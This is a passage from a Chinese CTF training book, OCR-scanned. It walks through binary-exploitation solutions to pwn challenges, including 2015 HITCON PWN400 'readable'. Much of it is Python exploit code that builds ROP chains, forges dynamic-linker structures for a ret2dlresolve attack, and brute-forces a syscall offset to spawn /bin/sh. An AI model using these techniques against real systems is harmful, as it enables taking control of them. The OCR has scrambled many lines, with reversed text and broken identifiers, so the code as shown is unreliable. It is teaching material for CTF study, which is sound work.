#reloc index
#0x08049870=0x80482f8+0x1578
reloc_index=0x1578
#set jmprel +index where index isreloc_index
#0x080498a0=0x80481e0+0x16c*16notuseful
#0x080499c0=0x80481e0+0x17e*16
reloc_data_addr=0x08049870
reloc_data=generate_x86_reloc_data(0x17e,system_got)
#writereloc_data in0x08049870
#0x080499e0=0x8048260+0x1780
sym_data_addr=0x080499c0
sym_data=generate_x86_sym_data(0x1780)
#write sym_data in0x080499c0
func_name_addr=0x080499e0
#func_name_addr=0x08049870+0x120=0x080499c0
func_name="systemlx0o"
#write system in func_name_addr
---
## Page 361
CTF特训营：技术详解、解题方法与
11.6真题解析
361/1144
#bin_str_addr=bss_addr +0x140
bin_str_addr=0x080499f0
bin str="/bin/sh;lx00"
#write system in bin_str_addr
def get_io(target):
r_m=COLORED（RAW,“green")
W_m=COLORED（RAW,“blue)
return io
def pwn(io):
io.gdb_hint()
io.readuntil("input name:")
name =“sycloverlx00".ljust（17,"xff")
io.write(name)
io.read_until("input slogan:")
p_ret=0x080485c0
pp_ret=0x080485bf
pPp_ret=0x08048646
read_got=0x08049850
strlen_got=0x08049858
read_plt=0x08048360
write_plt=0x080483A0
main_addr=0x080484AC
shellcode=
shellcode += |32(read_plt)+ 132(ppp_ret) +I32(0) +I32(reloc_data_addr) + I32(
len(reloc_data))
shellcode += 132(read_plt) + I32(ppp_ret) + I32(0) +I32(sym_data_addr) + I32(len(
sym_data))
shellcode += |32(read_plt) + I32(ppp_ret) + I32(0) + I32(func_name_addr) + I132(
len(func_name))
shellcode += i32(read_plt)+ 132(ppp_ret) +132(0) +I32(bin_str_addr) + 132(len(
bin_str)
shellcode+=|32（main_addr)
ebp=132(0x01010101)
pooeys+dqe+8,+（txo)z1+06xo,=peoed
print len(payload)
io.write(payload)
io.write(reloc_data)
io.write(sym_data)
io.write(func_name)
io.write(bin_str)
#next time
io.read_until("input name:")
name ="sycloverlx00".ljust(17,"xff")
---
## Page 362
CTF特训营：技术详解、解题方法与
11.6真题解析
362/1144
io.write(name)
io.read_until("input slogan:)
shellcode="
shellcode += 132(PLT0) + I32(reloc_index)+I32(main_addr) + 132(bin_str_addr)
payload=a*0x90+132(0x4)+a*8+ebp+shellcode
print len(payload)
io.write(payload)
io.interact()
io=get_io（target)
(o)umd
2.x64的情况（2015-hitcon-PWN400之readable）
该题的逻辑如图11-18所示。
ssize_t main_4004FD()
charbuf[16];//[sp+0h] [bp-10h]@1
return read（θ,buf，32ul）；
图11-18PWN400的反编译代码
该题的漏洞一目了然，buf只有16字节，然而可以读取32字节，
覆盖rbp和rip，通过覆盖rbp可以转移栈，通过覆盖rip可以将其改成
main函数的入口，从而对漏洞实现多次利用，达到任意地址写的目
的。由于只有任意地址写权限，而没有读权限，因此几乎无法泄露信
---
## Page 363
CTF特训营：技术详解、解题方法与
11.6真题解析
363/1144
息，利用常规方法则会比较难。
解题方法一
爆破获取read函数中调用system_call的偏移，将eax修改成ox3b，
然后将/bin/sh压入栈，并将rdi指向它，同时将rsi和rdx分别设置为0，
相当于调用了execvl（"/bin/sh"，0.0），从而实现shell的获取（ppp当时采
用的就是这种方法）。
爆破逻辑可这样理解。由于read的真实实现类似于：
moveax，0x0；read的系统调用号
call system_call
同理，write的实现如下：
moveax，0x1；write的系统调用号
call system_call
execv的实现如下：
moveax，Ox3b;execv的系统调用号
---
## Page 364
CTF特训营：技术详解、解题方法与
11.6真题解析
364/1144
call system_call
因此，如果知道了调用system_call距离read函数的偏移，那么直
接将read的got表的最后一位修改成其他的系统调用号，就可以执行
其他的函数功能了。爆破的时候利用write的函数进行打印测试，如果
能够正常打印，则说明偏移是正确的，否则程序将读不到相关信息。
爆破的shellcode只覆盖read函数的最低位，然后调用read（相当
于调用write），打印相关的头部信息，如图11-19所示。
+=164（set_args_addr)
do
164(0x0)+164（0x01)
164(cal1_func_addr)
+164（read_got)+164（θx01)+164（read_got)+164（0xθ)
rop
rop
op
164(ca11_func_addr)
图11-19rop利用代码
判断逻辑，只将一个偏移dis（爆破，依次累加尝试）写入，然
后判断读取的信息是否正确，如图11-20所示。
---
## Page 365
CTF特训营：技术详解、解题方法与
11.6真题解析
365/1144
io.write（'e**0x10+164（buff_addr-0x8)+164（leave_ret))
io.write(chr(dis))
data=io.read（4)
#data =io.read（4)
print [c forc in data]
if data =="\x7fELF":
print “find it",
":",hex（dis)
raw_input()
图11-20爆破的判断逻辑
得到正确的偏移之后，就可以直接利用了，exp代码如下：
xxd=Joune
fromzio import*
target ="/readable"
def get_io(target):
r_m=COLORED（RAW,“green")
W_m=COLORED（RAW,“blue”)
io=zio（target,timeout =9999,print_read=r_m,print_write= w_m）
return io
def brute_syscall_addr(io, dis):
bss_addr=0x600910
buff_addr=bss_addr+0x20
main_addr=0x400505
head_addr=0x0000000000400000
p_rdi_ret=0x0000000000400593
pp_rsi_r15_ret=0x0000000000400591
set_args_addr=0x40058A
call_func_addr=0x400570
read_got=0x00000000006008e8
leave_ret =0x400520
rop = 
rop += I64(set_args_addr)
#rbx,rbp,r12,r13,r14,r15
rop += I64(0x0) + 164(0x01) +164(read_got) + 164(0x01) + 164(read_got) + 164(0x0)
rop+=164(call_func_addr)
rop+='a'*8
#rbx,rbp,r12,r13,r14,r15
）91+（ppepeey）91+（t0x0）91+（06pe）91+（0x0）91+(0x0)+91=+do
---
## Page 366
CTF特训营：技术详解、解题方法与
11.6真题解析
366/1144
0x1)
rop += I64(call_func_addr)
length=len（rop)
if length %16I=0:
length+=16-length%16
payload =rop.ljust(length,x90)
#print length，length/16
#io.gdb_hint()
for i in range(0, length, 16):
io.write(0'*0x10+164（buff_addr+0x10+i)+164（main_addr))
io.write（payload[i:i+16]+164（bss_addr+0x10)+164（main_addr))
io.write(0*0x10+164（buff_addr-0x8)+164（leave_ret))
io.write(chr(dis))
data = io.read(4)
#data =io.read(4)
print[cforcin data]
if data =="x7fELF"
print “find it”, "", hex(dis)
raw_input()
def get_syscall_dis():
dis=0
for dis
in range(0, 0x100):
try:
print dis
io=get_io（target)
brute_syscal_addr(io, dis)
except Exception,e:
raise
else:
pass
finally:
pass
def pwn(io,dis):
bss_addr=0x600910
buff_addr=bss_addr+0x20
main_addr=0x400505
headaddr=0x0000000000400000
p_rdi_ret=0x0000000000400593
pp_rsi_r15_ret=0x0000000000400591
set_args_addr=0x40058A
call funcaddr=0x400570
read_got=0x00000000006008e8
leave_ret=0x400520
rop=
---
## Page 367
CTF特训营：技术详解、解题方法与
11.6真题解析
367/1144
rop += 164(set_args_addr)
#rbx,rbp,r12,r13,r14,r15
（+qx0-16pe）91+（qx0）91+（6pe）91+（0x0）91+(0x0）9=+do
+164(0x0)
rop += 164(call_func_addr)
rop+='a*8
#rbx,rbp,r12,r13,r14,r15
（ppessq)91+(0x0）+91+（0x0）+91+（106pe1）+91+（0x0）+91+（0x0）+91=+do
rop += 164(call_func_addr)
length=len（rop)
if length%16=0:
length+=16-length%16
payload = rop.ljust(length, x90")
#print length,length/16
io.gdb_hint()
foriin range(0,length,16):
io.write（0'*0x10+164（buff_addr+0x10+i)+164（main_addr))
io.write（payload[i:i+16]+164（bss_addr+0x10)+164（main_addr))
padding="/bin/sh".just（0x10,x00)
io.write(padding+164(buff_addr-0x8)+164(leave_ret))
io.write(0'*（0x3b-1)+chr（dis）)
io.interact()
io=get_io（target)
dis=0x3e
pwn(io, dis)
解题方法二
使用dl_resolve进行求解。使用dl_resolve方法来求解的时候，相
对来说就较为简单，通过漏洞的多次利用，将需要的伪造信息填入到
内存中去，如图11-21所示。
---
## Page 368
CTF特训营：技术详解、解题方法与
11.6真题解析
368/1144
#modify versym dynamicaddr0x40031e
index*2=0x3d57d6
write_data_to(0x600858,164(0x6ffffff0)+164(0x3d57d6))
write_data_to（0x600940,reloc_data)
write_data_to(0x600a10,sym_data)
#io.gdb_hint（）
write_data_to（0x600a80,func_name)
write_data_to(0x600aa0,
"/bin/sh;\x0e")
图11-21布局d_resolve的结构
计算出各自的偏移，然后通过一个rop直接调用plto进行解析即
可，如图11-22所示。
rop
rop
十=
164(p_rdi_ret)+164（0x600aa0)
#/bin/sh
rop
+=
164(PLT0)
rop+=
164（index）
图11-22通过rop触发d_resolve
对应的exp代码如下：
#-*-- coding:utf8 -..
from zio import *
target ="/readable”
def get_io(target):
r_m=COLORED（RAW,“green")
W_m=COLORED（RAW,“blue")
io=zio（target,timeout =9999,print_read =r_m,print_write= w_m)
return io
DT_JMPREL=0x400360 #offset,info
DT_STRTAB=0x4002e0 #strings array
---
## Page 369
CTF特训营：技术详解、解题方法与.
11.6真题解析
369/1144
DT_SYMTAB=0x400280#st_name,...st_info,s_other
DT_VERSYM=0x40031e
PLT0=0x00000000004003d0
#x64
#EIf64_Rel*reloc=JMPREL+index*3*8
#EIf64_Sym*sym=&SYMTAB[(（reloc->r_info)>>0x20)]
#i.e.*sym=DT_SYMTAB+（reloc->r_info)*3*8
#assert(（reloc->r_info）&0xff)==0x7)type
#=>if(sym->st other)&3==0）if notresolved
#uint16_tndx=VERSYM[（reloc->r_info)>>0x20]
#r_found_versionversion=&l->_version[ndx]
#name=STRTAB+sym->st_name
#modify (jmprel+0x18*index)<==fake_relro
#modify（symtab+0x18*r_sym）<==fake_sym
#modify（strtab+st_name)<=='system'
第2点在64位系统中很难满足，第1点需要泄露lin_map的值。
defgenerate_x64_reloc_data(index,got_plt):
return164(got_plt)+164（0x07+(index<<0x20))+164（0）
defgenerate_x64_sym_data(name_offset):
return 132(name_offset) +I32(0x12) +164(0) +164(0)
def write_data to（address,data):
main_addr=0x400505
bss_addr=0x600910
length=len(data)
if length%16=0:
length+=16-length%16
payload = data.ljust(length,x90)
#io.gdb _hint()
fori in range(0,length,16):
io.write(0'*0x10+164(address+0x10 +i)+I64（main_addr))
io.write(payload[i:i+16] + 164(bss_addr + 0x10) + 164(main_addr))
def pwn(io):
bss_addr=0x600910
buff_addr=bss_addr+0x20
buff_addr=0x600910+0x30
buff addr=0x600940
system_got_plt=0x600930
#0x600940=0x400360+0x15594*3*8
index=0x15594
#0x600a10=0x400280+0x155a6*3*8
reloc_data=generate_x64_reloc_data(0x155a6,system_got_plt)
#writereloc_datain0x600940
---
## Page 370
CTF特训营：技术详解、解题方法与
11.6真题解析
370/1144
#0x600a80=0x4002e0+0x2007a0
sym_data=generate_x64_sym_data(0x2007a0)
#write sym_data in 0x600a10
func_name="systemlx00"
#write system in0x600a80
main_addr =0x400505
pop_rbp_ret=0x0000000000400455
p_rdi_ret=0x0000000000400593